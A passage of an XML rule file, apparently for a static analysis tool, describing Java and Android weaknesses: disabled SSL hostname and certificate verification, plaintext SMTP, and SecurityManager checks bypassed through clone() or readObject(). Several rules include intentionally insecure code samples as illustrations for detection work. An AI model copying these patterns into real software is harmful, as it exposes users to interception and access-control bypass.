																									   <p>[9] J. Viega, G. McGraw <em>Building Secure Software</em> Addison-Wesley<br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 330</em> <br></p>
																									   <p>[11] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Information Leakage</em> <br></p>
																									   <p>[12]  <em>Java Cryptography Architecture</em> Sun Microsystems<br></p>
																									   <p>[13] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M6 Broken Cryptography</em> <br></p>
																									   <p>[14] Standards Mapping - FIPS200 - (FISMA) <em>MP</em> <br></p>
																									   <p>[15] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Porous Defenses - CWE ID 330</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.3, Requirement 6.5.8</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.3</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.3</em> <br></p>
																									   <p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.8</em> <br></p>
																									   <p>[20] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-13 Cryptographic Protection (P1)</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>security-features</tag>
	</rule>
	<rule>
		<key>security_features_insecure_ssl_android_customized_implementation
		</key>
		<internalKey>Security Features/Insecure SSL/Android Customized
			Implementation
		</internalKey>
		<name>Insecure SSL: Android Customized Implementation</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The application implements a custom SSL interface.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  The SSL standard provides guidelines on how to perform SSL validation checks on the client side.  These are however, not part of the standard. Thus, the implementation of the validation logic is left to the application developer.<br><br>Research has shown that the complexity and open nature of the SSL standard specification has several pitfalls making it difficult to get a flawless custom SSL implementation.  A large percentage of the Android applications that use custom SSL implementations are deficient in providing a secure communications channel, leaving the applications vulnerable to Man-in-the-Middle attacks.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A3 Broken Authentication and Session Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A9 Insecure Communications</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A9 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - FIPS200 - (FISMA) <em>CM, SC</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 297, CWE ID 296, CWE ID 298, CWE ID 299</em> <br></p>
																									   <p>[11]  <em>Designing for Security</em> Android<br></p>
																									   <p>[12] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Information Leakage</em> <br></p>
																									   <p>[13] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M3 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[14]  <em>OWASP Top 10 Mobile Risks</em> OWASP<br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 4.1, Requirement 6.3.1.4, Requirement 6.5.9</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 4.1, Requirement 6.5.10</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 4.1, Requirement 6.5.4</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 4.1, Requirement 6.5.4</em> <br></p>
																									   <p>[19] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-8 Transmission Confidentiality and Integrity (P1)</em> <br></p>
																									   <p>[20] S. Fahl, M. Harbach, T. Muders, M. Smith, L. Baumgartner, B. Friesleben <em>Why Eve and Mallory Love Android:An Analysis of Android SSL (In)Security</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>security-features</tag>
	</rule>
	<rule>
		<key>security_features_insecure_ssl_android_hostname_verification_disabled
		</key>
		<internalKey>Security Features/Insecure SSL/Android Hostname
			Verification Disabled
		</internalKey>
		<name>Insecure SSL: Android Hostname Verification Disabled</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Hostname verification is disabled when making SSL connections.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Use of <code>AllowAllHostnameVerifier()</code> or <code>SSLSocketFactory.ALLOW_ALL_HOSTNAME_VERIFIER</code> essentially turns off hostname verification when using SSL connections. This is equivalent to trusting all certificates.<br><br><b>Example 1:</b>The application sets the hostname verifier as below.<br><br><pre><br>...<br>SSLSocketFactory sf = new CustomSSLSocketFactory(trustStore);<br>sf.setHostnameVerifier(SSLSocketFactory.ALLOW_ALL_HOSTNAME_VERIFIER);<br>...<br></pre><br><br>This application when trying to connect to https://safesecureserver.banking.com would readily accept a certificate issued to https://hackedserver.banking.com.The application would now potentially leak sensitive user information on a broken SSL connection to the hacked server.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A3 Broken Authentication and Session Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A9 Insecure Communications</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A9 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - FIPS200 - (FISMA) <em>CM, SC</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 297</em> <br></p>
																									   <p>[11]  <em>Designing for Security</em> Android<br></p>
																									   <p>[12] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Information Leakage</em> <br></p>
																									   <p>[13] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M3 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[14]  <em>OWASP Top 10 Mobile Risks</em> OWASP<br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 4.1, Requirement 6.3.1.4, Requirement 6.5.9</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 4.1, Requirement 6.5.10</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 4.1, Requirement 6.5.4</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 4.1, Requirement 6.5.4</em> <br></p>
																									   <p>[19] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-8 Transmission Confidentiality and Integrity (P1)</em> <br></p>
																									   <p>[20] S. Fahl, M. Harbach, T. Muders, M. Smith, L. Baumgartner, B. Friesleben <em>Why Eve and Mallory Love Android:An Analysis of Android SSL (In)Security</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>security-features</tag>
	</rule>
	<rule>
		<key>security_features_insecure_ssl_android_socket</key>
		<internalKey>Security Features/Insecure SSL/Android Socket
		</internalKey>
		<name>Insecure SSL: Android Socket</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The method fails to make SSL verification checks.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Calls to <code>createSocket()</code>, that take in InetAddress as a function parameter, do not perform hostname verification.<br><br>Similarily, calls to <code>getInsecure()</code> returns a SSL socket factory with all SSL checks disabled.<br><br>Both of these render the application susceptible to Man-in-the-Middle attack.<br><br>For example the application when trying to connect to https://safesecureserver.banking.com would readily accept a certificate issued to https://hackedserver.banking.com.The application would now potentially leak sensitive user information on a broken SSL connection to the hacked server.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A3 Broken Authentication and Session Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A9 Insecure Communications</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A9 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - FIPS200 - (FISMA) <em>CM, SC</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 297</em> <br></p>
																									   <p>[11]  <em>Designing for Security</em> Android<br></p>
																									   <p>[12] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Information Leakage</em> <br></p>
																									   <p>[13]  <em>JavaDoc for Android</em> Android<br></p>
																									   <p>[14] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M3 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[15]  <em>OWASP Top 10 Mobile Risks</em> OWASP<br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 4.1, Requirement 6.3.1.4, Requirement 6.5.9</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 4.1, Requirement 6.5.10</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 4.1, Requirement 6.5.4</em> <br></p>
																									   <p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 4.1, Requirement 6.5.4</em> <br></p>
																									   <p>[20] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-8 Transmission Confidentiality and Integrity (P1)</em> <br></p>
																									   <p>[21] S. Fahl, M. Harbach, T. Muders, M. Smith, L. Baumgartner, B. Friesleben <em>Why Eve and Mallory Love Android:An Analysis of Android SSL (In)Security</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>security-features</tag>
	</rule>
	<rule>
		<key>security_features_insecure_ssl_server_identity_verification_disabled
		</key>
		<internalKey>Security Features/Insecure SSL/Server Identity
			Verification Disabled
		</internalKey>
		<name>Insecure SSL: Server Identity Verification Disabled</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Server identity verification is disabled when making SSL connections.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  In some libraries that use SSL connections, the server certificate is not verified by default. This is equivalent to trusting all certificates.<br><br>  <b>Example 1:</b> This application does not explicitly verify the server certificate.<br><br>  <pre><br>  ...<br>  Email email = new SimpleEmail();<br>  email.setHostName("smtp.servermail.com");<br>  email.setSmtpPort(465);<br>  email.setAuthenticator(new DefaultAuthenticator(username, password));<br>  email.setSSLOnConnect(true);<br>  email.setFrom("user@gmail.com");<br>  email.setSubject("TestMail");<br>  email.setMsg("This is a test mail ... :-)");<br>  email.addTo("foo@bar.com");<br>  email.send();<br>  ...<br>  </pre><br><br>  When trying to connect to smtp.mailserver.com:465, this application would readily accept a certificate issued to hackedserver.com. The application would now potentially leak sensitive user information on a broken SSL connection to the hacked server.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A3 Broken Authentication and Session Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A9 Insecure Communications</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A9 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - FIPS200 - (FISMA) <em>CM, SC</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 297</em> <br></p>
																									   <p>[11] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Information Leakage</em> <br></p>
																									   <p>[12] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M3 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 4.1, Requirement 6.3.1.4, Requirement 6.5.9</em> <br></p>
																									   <p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 4.1, Requirement 6.5.10</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 4.1, Requirement 6.5.4</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 4.1, Requirement 6.5.4</em> <br></p>
																									   <p>[17] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-8 Transmission Confidentiality and Integrity (P1)</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>security-features</tag>
	</rule>
	<rule>
		<key>security_features_insecure_transport_mail_transmission</key>
		<internalKey>Security Features/Insecure Transport/Mail Transmission
		</internalKey>
		<name>Insecure Transport: Mail Transmission</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Establishing an unencrypted connection to a mail server allows an attacker to carry out a man in the middle attack and read all the mail transmissions.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Sensitive data sent over the wire unencrypted is subject to be read/modified by any attacker that can intercept the network traffic.<br><br><b>Example 1:</b> The following Spring Mailer is NOT configured correctly to use SSL/TLS to communicate with an SMTP server:<br><br><pre><br>&lt;bean id="mailSender" class="org.springframework.mail.javamail.JavaMailSenderImpl"&gt;<br>    &lt;property name="host" value="smtp.acme.com" /&gt;<br>    &lt;property name="port" value="25" /&gt;<br>    &lt;property name="javaMailProperties"&gt;<br>        &lt;props&gt;<br>            &lt;prop key="mail.smtp.auth"&gt;true&lt;/prop&gt;<br>        &lt;/props&gt;<br>    &lt;/property&gt;<br>&lt;/bean&gt;<br></pre><br>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A10 Insecure Configuration Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A9 Insecure Communications</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A9 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3250.1 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3250.1 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3250.1 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3250.1 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3250.1 CAT I</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 200</em> <br></p>
																									   <p>[11] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Insecure Interaction - CWE ID 319</em> <br></p>
																									   <p>[12] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M3 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 4.1, Requirement 6.3.1.4, Requirement 6.5.9</em> <br></p>
																									   <p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.10</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.4</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.4</em> <br></p>
																									   <p>[17] Standards Mapping - FIPS200 - (FISMA) <em>SC</em> <br></p>
																									   <p>[18] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-8 Transmission Confidentiality and Integrity (P1)</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>security-features</tag>
	</rule>
	<rule>
		<key>security_features_missing_securitymanager_check_cloneable</key>
		<internalKey>Security Features/Missing SecurityManager Check/Cloneable
		</internalKey>
		<name>Missing SecurityManager Check: Cloneable</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  A cloneable class that performs this check in its constructor needs to perform the same check in its <code>clone()</code> method.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  When a class's <code>clone()</code> method is invoked, the constructor for the class being cloned is not invoked. Thus, if a SecurityManager or AccessController check is present in the constructor of a cloneable class, the same check must also be present in the clone method of the class. Otherwise, the security check will be bypassed when the class is cloned.<br><br><b>Example 1:</b> The following code contains a <code>SecurityManager</code> check in the constructor but not in the <code>clone()</code> method.<br><pre><br>public class BadSecurityCheck implements Cloneable {<br><br>private int id;<br><br>public BadSecurityCheck() {<br>    SecurityManager sm = System.getSecurityManager();<br>    if (sm != null) {<br>        sm.checkPermission(new BadPermission("BadSecurityCheck"));<br>    }<br>    id = 1;<br>}<br><br>public Object clone() throws CloneNotSupportedException {<br>    BadSecurityCheck bsm = (BadSecurityCheck)super.clone();<br>    return null;<br>}<br>}<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1]  <em>"Secure Coding Guidelines for the Java Programming Language, version 2.0" Sun Microsystems, Inc. [Online]. [Accessed: Aug. 30, 2007].</em> Sun Microsystems, Inc.<br></p>
																									   <p>[2] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>AC-3 Access Enforcement (P1)</em> <br></p>
																									   <p>[3] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 358</em> <br></p>
																									   <p>[4] C. Lai <em>Java Insecurity: Accounting for Subtleties That Can Compromise Code</em> <br></p>
																									   <p>[5] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M5 Poor Authorization and Authentication</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>security-features</tag>
	</rule>
	<rule>
		<key>security_features_missing_securitymanager_check_serializable
		</key>
		<internalKey>Security Features/Missing SecurityManager
			Check/Serializable
		</internalKey>
		<name>Missing SecurityManager Check: Serializable</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  A serializable class that performs a <code>SecurityManager</code> check in its constructor needs to perform the same check in its <code>readObject()</code> and <code>readObjectNoData</code> methods.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  When a serializable class's <code>readObject()</code> method is invoked, the constructor for the class being deserialized is not invoked. Thus, if a <code>SecurityManager</code> check is present in the constructor of a serializable class, the same <code>SecurityManager</code> check must also be present in the <code>readObject()</code> and <code>readObjectNoData()</code> methods. Otherwise, the security check will be bypassed when the class is deserialized.<br><br><b>Example 1:</b> The following code contains a <code>SecurityManager</code> check in the constructor but not in the <code>readObject()</code> and <code>readObjectNoData()</code> methods.<br><pre><br>public class BadSecurityCheck implements Serializable {<br><br>private int id;<br><br>public BadSecurityCheck() {<br>    SecurityManager sm = System.getSecurityManager();<br>    if (sm != null) {<br>        sm.checkPermission(new BadPermission("BadSecurityCheck"));<br>    }<br>    id = 1;<br>}<br><br>public void readObject(ObjectInputStream in) throws ClassNotFoundException, IOException {<br>    in.defaultReadObject();<br>}<br><br>public void readObjectNoData(ObjectInputStream in) throws ClassNotFoundException, IOException {<br>    in.defaultReadObject();<br>}<br>}<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1]  <em>"Secure Coding Guidelines for the Java Programming Language, version 2.0" Sun Microsystems, Inc. [Online]. [Accessed: Aug. 30, 2007].</em> Sun Microsystems, Inc.<br></p>
																									   <p>[2] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>AC-3 Access Enforcement (P1)</em> <br></p>
																									   <p>[3] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 358</em> <br></p>
																									   <p>[4] C. Lai <em>Java Insecurity: Accounting for Subtleties That Can Compromise Code</em> <br></p>
																									   <p>[5] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M5 Poor Authorization and Authentication</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>security-features</tag>
	</rule>
	<rule>
		<key>security_features_often_misused_android_permission_check</key>
		<internalKey>Security Features/Often Misused/Android Permission Check
		</internalKey>
		<name>Often Misused: Android Permission Check</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The functions, checkCallingOrSelfPermission() or checkCallingOrSelfUriPermission(), should be used with care as it allows the calling program, without the required or no permissions, to bypass the permission check, by using your application's permissions.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  The function <code>checkCallingOrSelfPermission()</code> or <code>checkCallingOrSelfUriPermission()</code> determine whether the calling program has the required permission to access a certain service or a given URI.  However, these functions should be used with care as they can grant access to malicious applications, lacking the appropriate permissions, by assuming your applications permissions.<br><br>This means a malicious application, without appropriate permissions, can bypass its permission check by using your application's permission to get access to otherwise denied resources. This can result in what is known as the confused deputy attack.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A2 Broken Access Control</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A4 Insecure Direct Object Reference</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A4 Insecure Direct Object References</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A4 Insecure Direct Object References</em> <br></p>
																									   <p>[5] Standards Mapping - FIPS200 - (FISMA) <em>AC</em> <br></p>
																									   <p>[6] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>AC-3 Access Enforcement (P1)</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I</em> <br></p>
																									   <p>[10] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I</em> <br></p>
																									   <p>[11] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I</em> <br></p>
																									   <p>[12]  <em>Context: Android Developers</em> Android<br></p>
																									   <p>[13] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 275</em> <br></p>
																									   <p>[14]  <em>Designing for Security</em> Android<br></p>
																									   <p>[15] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Insufficient Authorization</em> <br></p>
																									   <p>[16] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M5 Poor Authorization and Authentication</em> <br></p>
																									   <p>[17] Standards Mapping - SANS Top 25 2011 - (SANS Top 25 2011) <em>Porous Defenses - CWE ID 863</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.2</em> <br></p>
																									   <p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.5.4</em> <br></p>
																									   <p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.8</em> <br></p>
																									   <p>[21] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.8</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>security-features</tag>
	</rule>
	<rule>
		<key>security_features_pci_privacy_violation</key>
		<internalKey>Security Features/PCI Privacy Violation</internalKey>
		<name>PCI Privacy Violation</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Mishandling private information, such as customer passwords or social security numbers, can compromise user privacy and is often illegal. 
							</p>
							<h2>EXPLANATION</h2>
							<p>
